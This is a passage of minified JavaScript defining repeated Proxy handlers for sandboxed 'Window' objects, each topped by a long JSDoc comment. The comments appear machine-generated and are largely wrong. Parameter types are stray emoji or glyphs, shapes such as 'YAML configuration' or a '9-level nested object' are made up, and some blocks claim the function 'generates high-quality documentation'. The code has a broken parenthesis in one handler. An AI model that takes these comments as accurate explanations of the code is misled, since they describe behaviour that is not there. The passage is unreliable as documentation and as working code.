                         * and `false` otherwise.
                         * 		- `p(d[t])`: This property is set to `true` if the `set` method can be called
                         * on the object, and `false` otherwise.
                         * 		- `Gt(value)`: This property is set to the result of calling the `get` method
                         * on the object, if it exists and is callable. Otherwise, it is set to `undefined`.
                         * 
                         * 
                         * @param { number } n - name of a property that is being set or accessed, and is
                         * used in various conditions within the function to determine the appropriate action
                         * to take.
                         * 
                         * @returns { boolean } a boolean value indicating whether the set operation was successful.
                         */
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = d[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(d, t, n),
                            d[t] && d[t].configurable && d[t].writable && d[t].value && "function" == typeof d[t].value && !p(d[t].value) && (d[t].value = Gt(d[t].value)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].get && !p(d[t].get) && (d[t].get = Gt(d[t].get)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].set && !p(d[t].set) && (d[t].set = Gt(d[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(g), (e=>{
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const p = Gt({})
                      , v = Gt({});
                    Lt(v, hn, "Window");
                    const b = new Un(v,Gt({
                        /**
                         * @description modifies the property descriptor of an object, allowing for configuration
                         * and write access control, while also providing getters and setters for certain properties.
                         * 
                         * @param { object } e - 3rd argument of the `i()` function, which is used to determine
                         * if an object's properties can be modified.
                         * 
                         * @param { object } t - property name for which the configurable, enumerable, and
                         * value attributes are checked, and its value is used to determine the appropriate
                         * action to take based on those attributes.
                         * 
                         * @param { object } n - name of the property to be set or retrieved in the code execution.
                         * 
                         * @returns { boolean } an object with property name, value, configurable, enumerable,
                         * and writable attributes.
                         */
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && p[t] || o && o.get && !o.set ? (vt(r ? v : p, t, s),
                            !1) : (vt(v, t, s),
                            v[t] && v[t].configurable && v[t].writable && v[t].value && "function" == typeof v[t].value && !p(v[t].value) && (v[t].value = Gt(v[t].value)),
                            v[t] && !v[t].configurable && "function" == typeof v[t].get && !p(v[t].get) && (v[t].get = Gt(v[t].get)),
                            v[t] && !v[t].configurable && "function" == typeof v[t].set && !p(v[t].set) && (v[t].set = Gt(v[t].set)),
                            delete p[t],
                            !0)
                        }
                        ,
                        /**
                         * @description checks if a property exists in an object or not and whether it can
                         * be deleted based on its configurability. It returns `true` if the property can be
                         * deleted, else `false`.
                         * 
                         * @param { object } e - global object and is used to check if there are any configuration
                         * properties present on it that need to be deleted when the corresponding function
                         * is executed.
                         * 
                         * @param { string } t - 4-tuple of values (`e`, `t`, `d`, and `l`) that make up the
                         * current context item being evaluated for deletion.
                         * 
                         * @returns { boolean } an array of properties that are deleted from a given object.
                         */
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = v[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            v[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete v[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        /**
                         * @description returns a value or an observable stream associated with a key in a
                         * given object or an inner class member variable, if any, and checks for existence
                         * and bindness of the value or stream.
                         * 
                         * @param { 𝘏 value or expression. } e - value of the `d` property in the nested `v`
                         * object, and is used to initialize the returned value from the `It` or `Gt` function
                         * if it exists.
                         * 
                         * 		- `o`: If `o` is defined in the input, it represents the value that was returned
                         * by the `get` method or the `value` property of a serialized object.
                         * 		- `d`: If `d` is defined in the input, it represents the delete operator that
                         * is used to remove properties from the serialized object.
                         * 		- `r`: If `r` is defined in the input, it represents the serialized object that
                         * contains properties and methods that are to be deserialized.
                         * 		- `t`: This represents the token of the input operation, which is used to identify
                         * the input operation in the `get` function.
                         * 
                         * 
                         * @param { string } t - property or method to retrieve from an object or to perform
                         * an action on.
                         * 
                         * @returns { : `oid`. } a value or an object reference.
                         * 
                         * 		- `once`: If set to `true`, the output is cached for future retrieval.
                         * 		- `bind`: If set to a function, it binds the output to that function.
                         * 		- `value`: The value of the output, if it exists.
                         * 		- `get`: A function that returns the output on request.
                         */
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = v[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description describes the functionality of this function as returning an object
                         * containing information about the properties on an object.
                         * 
                         * @param { any } e - 🎥 value of the property at the time of initialization and is
                         * used to determine whether the property is configurable or not.
                         * 
                         * @param { object } t - object to which the getter and setter functions will be applied.
                         * 
                         * @returns { object } an object containing information about a property on an object,
                         * including its enumerability, configurability, writability, and value.
                         */
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = v[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(v, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in v,
                        /**
                         * @description iterates through an object's own enumerable keys and returns a new
                         * array with only those keys that are not present in the object's prototype chain.
                         * 
                         * @returns { array } an array of unique object properties.
                         */
                        ownKeys: ()=>{
                            const e = e=>!(e in p)
                              , t = gt(p)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(v, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        /**
                         * @description sets a value for a property in an object based on a given name. It
                         * checks if the property exists, is writable and has a setter function, and if not
                         * it creates a new value and sets it.
                         * 
                         * @param { integer } e - xtype of the object being processed, which is used to
                         * determine the correct method to use for setting the value of the property.
                         * 
                         * @param { 𝐺 (Undefined). } t - 4-byte token of an object property, which is used
                         * to determine whether the property is writable and its value can be modified.
                         * 
                         * 		- `o`: The object that is being serialized. If it has a `set` method, then the
                         * function will return `true`.
                         * 		- `d`: An object property of the input `t`. It contains the value and configuration
                         * information for the property. If the property is not writable or the value cannot
                         * be changed, then the function will return `false`.
                         * 		- `v`: An array property of the input `t` containing objects that are being
                         * serialized. Each object in the array has its own properties and methods.
                         * 
                         * 
                         * @param { number } n - 4th argument passed to the function, which is used to set
                         * the value of the nested object within the function.
                         * 
                         * @returns { `undefined`. } `true` if the setting was successful, otherwise `false`.
                         * 
                         * 		- If `o` is present and has a `set` method, the `set` method is called on `o`
                         * with the given `n`.
                         * 		- If `d` is present and has a writable and value property, the value of `d` is
                         * set to the result of calling the `function` named in `value`. If the resulting
                         * value is not truthy (i.e., it is falsey or nullish), the value of `d` is unchanged.
                         * 		- If `o` or `d` have a configurable property, and that property has a getter
                         * method named `get`, the value of `o` or `d` is set to the result of calling the
                         * `get` method. If the resulting value is not truthy (i.e., it is falsey or nullish),
                         * the value of `o` or `d` is unchanged.
                         * 		- If `o` or `d` have a configurable property, and that property has a setter
                         * method named `set`, the value of `o` or `d` is set to the result of calling the
                         * `set` method. If the resulting value is not truthy (i.e., it is falsey or nullish),
                         * the value of `o` or `d` is unchanged.
                         * 		- The function returns `!0` if any of the above actions are performed, indicating
                         * that the output was modified.
                         */
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = v[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(v, t, n),
                            v[t] && v[t].configurable && v[t].writable && v[t].value && "function" == typeof v[t].value && !p(v[t].value) && (v[t].value = Gt(v[t].value)),
                            v[t] && !v[t].configurable && "function" == typeof v[t].get && !p(v[t].get) && (v[t].get = Gt(v[t].get)),
                            v[t] && !v[t].configurable && "function" == typeof v[t].set && !p(v[t].set) && (v[t].set = Gt(v[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(b), (e=>{
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const w = Gt({})
                      , y = Gt({});
                    Lt(y, hn, "Window");
                    const E = new Un(y,Gt({
                        /**
                         * @description modifies an object's properties by adding, removing, or altering
                         * existing properties. It takes three arguments: the object to modify (`e`), the
                         * property name (`t`), and the value (`n`).
                         * 
                         * @param { object } e - current object being processed, which is used to access its
                         * properties and methods in order to delete any unwanted properties or functions.
                         * 
                         * @param { enumerable or writable property. } t - property or method that needs to
                         * be deleted.
                         * 
                         * 		- `d`: The enumerable value of `t`.
                         * 		- `l`: The configurable value of `t`.
                         * 		- `w`: The writable value of `t`.
                         * 		- `o`: An optional property bag for serialization.
                         * 		- `n`: The value of `t`, which can be a primitive or an object with properties
                         * defined using the `defineProperty` function.
                         * 
                         * 	The function explains each property/attribute of `t` and their relationships with
                         * other values in the function's body.
                         * 
                         * 
                         * @param { 𝘽 (configurable). } n - property to be deleted, and its value is used
                         * to determine whether the property is configurable or not before it is deleted.
                         * 
                         * 		- `d`: The property descriptor object.
                         * 		- `l`: The property's value.
                         * 		- `w`: The property's writeable status.
                         * 		- `o`: The property's enumerable status.
                         * 
                         * 	The function then performs various operations based on the values of these
                         * properties, including:
                         * 
                         * 		- Setting the property's configurable and writable status to `true` or `false`.
                         * 		- Calling the property's get and set methods, if they exist, with their values
                         * set to the result of calling `Gt(value)`.
                         * 		- Deleting the property from the `y` object.
                         * 		- Deleting the property from the `e` object.
                         * 
                         * 	The function then checks whether the property was enumerable or not and takes
                         * appropriate actions accordingly.
                         * 
                         * 
                         * @returns { undefinded value. } a new property on the given object with specified
                         * attributes.
                         * 
                         * 		- `o`: An object containing information about the property, including its name
                         * (`d`), the value it holds (`l`), and any write access (`w`).
                         * 		- `s`: The setter function for the property, if one exists.
                         * 		- `y`: The object that the property was defined on.
                         * 		- `t`: The name of the property being defined or accessed.
                         * 		- `n`: The value being assigned to the property, or the current value of the
                         * property if it is a function.
                         * 		- `e`: The original value of the property, if different from the current value.
                         * 		- `r`: An object containing information about the property, including its name
                         * and value, if the property is an enumerable property on an object.
                         * 		- `Gt`: A getter function for the property, if one exists.
                         * 		- `lt`: The value of the property when it was last accessed.
                         * 
                         * 	In the `deleteProperty` function, the output returned by the `defineProperty`
                         * function is destructured and explained as follows:
                         * 
                         * 		- `e`: The value of the property being deleted, if any.
                         * 		- `t`: The name of the property being deleted.
                         * 		- `n`: The original value of the property, if different from the current value.
                         * 		- `o`: An object containing information about the property, including its name
                         * and value, if the property is an enumerable property on an object.
                         * 		- `r`: An object containing information about the property, including its name
                         * and value, if the property is an enumerable property on an object.
                         */
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && w[t] || o && o.get && !o.set ? (vt(r ? y : w, t, s),
                            !1) : (vt(y, t, s),
                            y[t] && y[t].configurable && y[t].writable && y[t].value && "function" == typeof y[t].value && !p(y[t].value) && (y[t].value = Gt(y[t].value)),
                            y[t] && !y[t].configurable && "function" == typeof y[t].get && !p(y[t].get) && (y[t].get = Gt(y[t].get)),
                            y[t] && !y[t].configurable && "function" == typeof y[t].set && !p(y[t].set && (y[t].set = Gt(y[t].set)),
                            delete w[t],
                            !0)
                        }
                        ,
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = y[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            y[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete y[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        /**
                         * @description resolves the value of an object or a function that has `value` or
                         * `get` properties, returning either the direct value or the result of calling the
                         * function.
                         * 
                         * @param { 'function' (). } e - value returned by the `get()` or `value` property
                         * of an object, and it is used to return the appropriate value based on whether the
                         * object has a `once` property and a `bind` method.
                         * 
                         * 		- If `e` is a plain object (i.e., not an array or a primitive), it may have a
                         * `once` property, which is a boolean indicating whether the object should be stored
                         * in the `zn` cache once it is encountered. If `once` is present and set to `true`,
                         * `e` will be cached and its value will be returned if it is requested again later.
                         * 		- If `e` has a `get` property, it will be called as a function to retrieve the
                         * object's value. The `get` function must return a value that can be stored in the
                         * `zn` cache.
                         * 		- If `e` has an `bind` property, it is a function that binds the object's value
                         * to the `e` variable. This allows the value of `e` to be retrieved later without
                         * having to perform a recursive descent into the object.
                         * 
                         * 	The function returns the deserialized input `e` if any of these properties are
                         * present and valid, otherwise it returns `void 0`.
                         * 
                         * 
                         * @param { � Union member (enumeration). } t - name of an object property to be
                         * retrieved or accessed, which is used to determine the corresponding value or method
                         * to return.
                         * 
                         * 		- `zn[t]:` It is an object that contains the value of the property specified by
                         * `t`. If `t` refers to a method, then `zn[t]` is a function.
                         * 		- `o`: It is the value of `t`, either as an object or a function. If `t` refers
                         * to a method, then `o` is the result of calling that method.
                         * 		- `once`: A boolean indicating whether `o` is a one-time value or not. If `o`
                         * is a function, then it is a one-time value if and only if its `once` property is
                         * set to `true`.
                         * 		- `d`: It is the data object of the method associated with `t`.
                         * 		- `r`: It is the result object of the method associated with `t`, which can be
                         * either an object or a function. If `r` is a function, then it is a one-time value
                         * if and only if its `once` property is set to `true`.
                         * 		- `e`: It is a variable that holds the result of calling the method associated
                         * with `t` if `r` is a function.
                         * 		- `It(r, "value"`: It is an internal function used to retrieve the value of an
                         * object.
                         * 		- `It(r, "get"`: It is an internal function used to retrieve the result of calling
                         * a method.
                         * 		- `Gt(o)`: It is an internal function used to wrap the returned value of a method
                         * call in a new object that implements the `Value` interface.
                         * 
                         * 
                         * @returns { object } the value or method of an object.
                         */
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = y[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description generates high-quality documentation for code given to it and modifies
                         * an object's properties according to user input, returning a new instance of the
                         * Get method
                         * 
                         * @param { object } e - HTMLElement object to be accessed or modified through the
                         * getters and setters created by the `zn` object.
                         * 
                         * @param { object } t - 0-based index of the property to be transformed into a getter
                         * or setter, and is used to access the corresponding property value or method from
                         * the `zn` object.
                         * 
                         * @returns { object } an object representing the properties and methods of an object.
                         */
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = y[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(y, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in y,
                        /**
                         * @description determines the unique keys of an object. It initializes a variable
                         * `e`, then sets `e` to the inverse of an object `w`. Next, it sets `t` to the greater
                         * than (`gt`) operation of `w` and `n` to the greatest (`Gt`) of two values `o` and
                         * the result of a function applied to the `HTMLElement` prototype chain (`Zt`). Then,
                         * the for loop iterates over the keys of the object, and for each key sets `o[e]`
                         * to `true`. Finally, it returns the results of applying `gt` operation to `o`, `n`,
                         * and the greatest (`Qt`) of the three.
                         * 
                         * @returns { array } an array of integers representing the property names of the
                         * provided object.
                         */
                        ownKeys: ()=>{
                            const e = e=>!(e in w)
                              , t = gt(w)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(y, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        /**
                         * @description sets a property on an object based on a condition, updating the object
                         * and returning `true` if successful.
                         * 
                         * @param { number } e - 2nd dimension of an array, `zn`, from which to retrieve and
                         * set values.
                         * 
                         * @param { object } t - property or field to be set, and it is used to determine
                         * whether the property can be set and how it should be set based on its configurability,
                         * writability, and value.
                         * 
                         * @param { unknown value (undetermined type) } n - 4th argument passed to the `o.set()`
                         * method, which is used to set the value of the property on the object `o`.
                         * 
                         * 		- If `o` is present in the object mapping, `o.set` is called to update the value
                         * of `n`.
                         * 		- If `d` is present in the YAML configuration, the property `writable` and
                         * `configurable` of `d` are checked. If either is `true`, then `It(d, "set")` checks
                         * if the `set` method exists and is callable. If both are `true`, then the value of
                         * `d` is updated using the `set` method.
                         * 		- If `n` is a function, it is treated as a callback function to update the value
                         * of the deserialized input.
                         * 		- If `p(y[t].value)` is `false`, the value of `y[t].value` is used directly.
                         * 		- If `p(y[t].get)` and `p(y[t].set)` are both `false`, the get and set methods
                         * of `y[t]` are called to update the value.
                         * 		- Otherwise, `n` is updated using the `Gt()` function.
                         * 
                         * 
                         * @returns { `undefiend` value if the operation is successful, otherwise it returns
                         * an undefined value. } a boolean value indicating whether the specified property
                         * was set successfully.
                         * 
                         * 		- `o`: The object to be set.
                         * 		- `d`: The destination property or object in the object tree.
                         * 		- `y`: The parent object containing the destination property or object.
                         * 		- `n`: The name of the property or method being set.
                         * 		- `t`: The type of the property or method being set (optional).
                         * 		- `z`: The current value of the property or method (if applicable).
                         * 		- `v`: The final value of the property or method after the set operation (if applicable).
                         * 		- `p`: A flag indicating whether the value can be changed (if applicable).
                         */
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = y[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(y, t, n),
                            y[t] && y[t].configurable && y[t].writable && y[t].value && "function" == typeof y[t].value && !p(y[t].value) && (y[t].value = Gt(y[t].value)),
                            y[t] && !y[t].configurable && "function" == typeof y[t].get && !p(y[t].get) && (y[t].get = Gt(y[t].get)),
                            y[t] && !y[t].configurable && "function" == typeof y[t].set && !p(y[t].set) && (y[t].set = Gt(y[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(E), (e=>{
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const S = Gt({})
                      , T = Gt({});
                    Lt(T, hn, "Window");
                    const O = new Un(T,Gt({
                        /**
                         * @description generates high-quality documentation for code. It takes an object,
                         * property name, and value as input. The function checks if the object has a
                         * configurable and writable property, and if it doesn't, it defines a getter and
                         * setter for the property. If the property is already defined, it returns whether
                         * or not to delete the property from the source map.
                         * 
                         * @param { object } e - ether variable for which the configuration and values are
                         * being determined.
                         * 
                         * @param { object } t - object being passed to the function, which is then accessed
                         * and modified based on its properties and methods.
                         * 
                         * @param { number } n - name of the property being accessed, which is used to determine
                         * whether the property is configurable or enumerable, and to identify the appropriate
                         * get and set functions to use.
                         * 
                         * @returns { enumerable/configurable property. } an updated property object with
                         * configurable, enumerable, and writable attributes set according to input objects.
                         * 
                         * 		- o and !o.configurable indicate whether the property is configurable or not.
                         * If o.configurable is true, then the property is configurable.
                         * 		- (!!o.configurable != !!s.configurable) or o.enumerable indicates whether the
                         * property is enumerable or not. If o.configurable is true and s.configurable is
                         * false, then the property is enumerable.
                         * 		- T[t] and vt(r ? T : S, t, s) explain that if a property exists at the given
                         * index t in the object T, then it gets its getter function (if any) and setter
                         * function (if any) from the same object T or its prototype chain.
                         * 		- T[t] && T[t].configurable && T[t].writable && T[t].value explain that if a
                         * property exists at the given index t in the object T and is configurable, writable,
                         * and has a value (which may be a function), then the value of that property can be
                         * changed by using the setter function.
                         * 		- delete S[t] explains that the given index t from the array S (prototypes) has
                         * been deleted.
                         * 
                         * 	In conclusion, the `defineProperty` function in the given code sets or modifies
                         * properties in an object and its prototypes, ensuring their consistency with the
                         * desired configurations and attributes.
                         */
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && S[t] || o && o.get && !o.set ? (vt(r ? T : S, t, s),
                            !1) : (vt(T, t, s),
                            T[t] && T[t].configurable && T[t].writable && T[t].value && "function" == typeof T[t].value && !p(T[t].value) && (T[t].value = Gt(T[t].value)),
                            T[t] && !T[t].configurable && "function" == typeof T[t].get && !p(T[t].get) && (T[t].get = Gt(T[t].get)),
                            T[t] && !T[t].configurable && "function" == typeof T[t].set && !p(T[t].set) && (T[t].set = Gt(T[t].set)),
                            delete S[t],
                            !0)
                        }
                        ,
                        /**
                         * @description deletes a property from an object and its tree-like structures,
                         * considering if the property is configurable or not, and returns whether the operation
                         * was successful or not.
                         * 
                         * @param { object } e - execution context in which the code is running.
                         * 
                         * @param { object } t - 4-value object `T` and is used to determine if a property
                         * `n` of that object is configurable, and if so, to delete it from both the object
                         * and the internal cache `zn`.
                         * 
                         * @returns { boolean } a boolean value indicating whether the specified property
                         * should be deleted from an object.
                         */
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = T[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            T[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete T[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        /**
                         * @description retrieves a value from an object or a promise, checking for optional
                         * bounding and once properties. If successful, it returns the value or the result
                         * of calling the object's `get()` method.
                         * 
                         * @param { `function`. } e - result of calling the `get()` or `value()` method on
                         * an object in the `T` array, and its value is returned if it is not undefined or null.
                         * 
                         * 		- `once`: A boolean indicating whether the `o` object is only once used in the
                         * computation. If `true`, it means that the object should not be stored for later use.
                         * 		- `value`: The value property of the `o` object, which can be accessed directly
                         * if the object supports the `get()` method.
                         * 		- `get`: A boolean indicating whether the `o` object has a `get()` method. If
                         * `true`, the `get()` method can be called on the object to retrieve its value.
                         * 		- `bind`: A boolean indicating whether the `o` object has a `bind()` method. If
                         * `true`, the `bind()` method can be called on the object to bind it to a particular
                         * context.
                         * 
                         * 
                         * @param { object } t - property or method that is being accessed or called on an object.
                         * 
                         * @returns { `r` value. } the value of the property `value` or the result of calling
                         * the `get` method, if it exists and is a function.
                         * 
                         * 		- `once`: If set to `true`, it indicates that the value is only valid once and
                         * should not be used after the first call.
                         * 		- `bind`: If present, it defines a binding for the `get` function, which allows
                         * calling the function with different `this` objects.
                         * 		- `value`: The value of the getter function. It can be either a primitive value
                         * or an object reference.
                         */
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = T[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description takes a target object and property name as input. It retrieves the
                         * descriptor for the specified property, checking if it's enumerable, configurable,
                         * writable, and returning an instance of the PropertyDescriber object with the
                         * relevant properties.
                         * 
                         * @param { object } e - getter function for the property `d`.
                         * 
                         * @param { unknown value because there is no explicit initialization and type checking
                         * performed at line 7, before being assigned to variables `o` and `r`. } t - name
                         * of an object property to be retrieved or set on the given target object `T`.
                         * 
                         * 		- `d`: An object with properties `{ enumerable: boolean, configurable: boolean,
                         * writable: boolean }`.
                         * 		- `l`: An array with the property `r`.
                         * 		- `o`: A value that represents the original value of `t`.
                         * 		- `i`: An instance of `Gt` that holds a reference to the value of `t` and provides
                         * methods for reading and writing its properties.
                         * 		- `z`: A variable that holds a reference to an object, which is not explicitly
                         * defined in the code snippet provided.
                         * 
                         * 
                         * @returns { object } an object containing the property's descriptor.
                         */
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = T[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(T, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in T,
                        /**
                         * @description generates a set of unique keys for an object's properties based on
                         * its own keys and values.
                         * 
                         * @returns { array } an array of unique strings representing the keys in the specified
                         * object.
                         */
                        ownKeys: ()=>{
                            const e = e=>!(e in S)
                              , t = gt(S)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(T, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        /**
                         * @description sets a property value, if possible and depending on its configuration,
                         * writeability and type.
                         * 
                         * @param { any } e - 9-level nested object `zn` that contains the property being
                         * modified, and is used to access the corresponding property value within the object.
                         * 
                         * @param { object } t - index of the object in the `Zn` or `T` array, and is used
                         * to locate the corresponding object in the array for operation.
                         * 
                         * @param { integer } n - new value that is being set to the property of the object
                         * passed as argument `o`.
                         * 
                         * @returns { `undefined` value. } `true` if the setting was successful, otherwise `false`.
                         * 
                         * 		- `o`: The object being modified, which is obtained from `zn[t]`.
                         * 		- `d`: The desired property or method for modification, which is retrieved from
                         * `T[t]`.
                         * 		- ` writable`: Whether the property or method is modifiable. If `true`, the
                         * property or method can be modified, otherwise it cannot be modified.
                         * 		- `value`: The value of the property or method, which is retrieved if available
                         * and can be modified. If `function` is the value type, then the function can be
                         * invoked and its output can be assigned to the property or method.
                         * 		- `configurable`: Whether the property or method can be modified in the object.
                         * If `true`, the property or method can be modified; otherwise, it cannot be modified.
                         * 		- `get`: A getter function associated with the property or method, which retrieves
                         * the value of the property or method if available. The getter function can also
                         * modify the property or method.
                         * 		- `set`: A setter function associated with the property or method, which sets
                         * the value of the property or method if available. The setter function can also
                         * modify the property or method.
                         */
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = T[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(T, t, n),
                            T[t] && T[t].configurable && T[t].writable && T[t].value && "function" == typeof T[t].value && !p(T[t].value) && (T[t].value = Gt(T[t].value)),
                            T[t] && !T[t].configurable && "function" == typeof T[t].get && !p(T[t].get) && (T[t].get = Gt(T[t].get)),
                            T[t] && !T[t].configurable && "function" == typeof T[t].set && !p(T[t].set) && (T[t].set = Gt(T[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(O), (e=>{
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const x = Gt({})
                      , C = Gt({});
                    Lt(C, hn, "Window");
                    const P = new Un(C,Gt({
                        /**
                         * @description modifies a property's accessor, configurable and writable flags
                         * and sets/gets value via a proxy when a property does not have
                         * an inherited config or writable flag. It also deletes the property
                         * from an object prototype if necessary.
                         * 
                         * @param { object } e - environment object that provides the desired type for the
                         * output of the function.
                         * 
                         * @param { object } t - 2nd argument passed to the function, which is used to determine
                         * whether the value of the object property is writable and configurable.
                         * 
                         * @param { object } n - environment object, which provides the configuration and
                         * other properties of the runtime context in which the code is executing.
                         * 
                         * @returns { object } a value indicating whether the property was successfully defined
                         * or not.
                         */
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && x[t] || o && o.get && !o.set ? (vt(r ? C : x, t, s),
                            !1) : (vt(C, t, s),
                            C[t] && C[t].configurable && C[t].writable && C[t].value && "function" == typeof C[t].value && !p(C[t].value) && (C[t].value = Gt(C[t].value)),
                            C[t] && !C[t].configurable && "function" == typeof C[t].get && !p(C[t].get) && (C[t].get = Gt(C[t].get)),
                            C[t] && !C[t].configurable && "function" == typeof C[t].set && !p(C[t].set) && (C[t].set = Gt(C[t].set)),
                            delete x[t],
                            !0)
                        }
                        ,
                        /**
                         * @description evaluates to true if the property does not exist or is not configurable,
                         * false otherwise.
                         * 
                         * @param { object } e - object that is passed to the function, which is then used
                         * to determine whether the value at key `t` can be deleted or not.
                         * 
                         * @param { object } t - 3-item object containing the property names, values, and
                         * configured status of the function to be deleted from the global namespace or the
                         * object.
                         * 
                         * @returns { boolean } a boolean value indicating whether the specified property
                         * exists and can be deleted.
                         */
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = C[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            C[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete C[t]),
